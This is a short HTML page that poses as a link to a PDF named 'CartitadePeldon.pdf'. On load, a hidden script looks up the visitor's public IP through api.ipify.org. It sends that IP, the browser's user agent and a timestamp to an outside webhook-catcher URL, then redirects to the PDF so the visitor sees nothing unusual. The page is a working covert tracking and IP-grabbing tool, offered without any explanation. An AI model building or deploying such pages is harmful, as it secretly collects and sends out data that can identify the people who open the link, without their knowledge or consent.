<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title></title>

<script>
(async () => {

const destino = "CartitadePeldon.pdf";
const webhook = "https://tools.myaiteam.com/webhook-catcher/webhook/9fd0f343122174183e72a2ae69de43bd";

let ip = "unknown";

try {
    const r = await fetch("https://api.ipify.org?format=json");
    const j = await r.json();
    ip = j.ip;
} catch(e){}

const data = {
    ip: ip,
    destino: destino,
    hora: new Date().toISOString(),
    userAgent: navigator.userAgent
};

const blob = new Blob([JSON.stringify(data)], {type : 'application/json'});

navigator.sendBeacon(webhook, blob);

window.location.replace(destino);

})();
</script>

</head>
<body>
</body>
</html>
